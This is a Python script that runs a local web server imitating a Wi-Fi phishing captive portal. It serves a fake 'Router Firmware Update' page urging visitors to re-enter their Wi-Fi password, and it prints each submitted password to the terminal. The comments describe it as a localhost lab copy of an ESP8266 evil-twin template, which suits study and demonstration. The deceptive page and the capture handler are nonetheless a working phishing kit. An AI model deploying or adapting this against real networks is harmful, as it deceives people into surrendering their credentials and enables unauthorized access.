import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer

# Configure to run entirely on your local laptop machine
LOCAL_HOST = "127.0.0.1"
PORT = 8080

# This is the identical HTML template from your ESP8266 code
HTML_CONTENT = """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; }
        input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Router Firmware Update</h2>
        <p>A critical router security update is installing. Please re-enter your Wi-Fi password to restore connectivity.</p>
        <form action="/submit" method="POST">
            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
            <button type="submit">Update Now</button>
        </form>
    </div>
</body>
</html>
"""

class LocalPortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve the HTML layout instantly to any local browser request
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(HTML_CONTENT, "utf-8"))

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Print the submitted test data clearly directly into your terminal window
            print("\n" + "="*45)
            print(f"[!] LOCAL CAPTURE SUCCESSFUL: {post_data}")
            print("="*45 + "\n")
            sys.stdout.flush()
            
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>Authentication received. Lab simulation complete.</h2>")
        else:
            self.do_GET()

def main():
    print(f"[*] Starting local simulation server on http://{LOCAL_HOST}:{PORT}")
    print("[*] Press Ctrl+C at any time to shut down the server.\n")
    
    try:
        server = HTTPServer((LOCAL_HOST, PORT), LocalPortalHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Shutting down local web server.")
    finally:
        server.server_close()

if __name__ == "__main__":
    main()
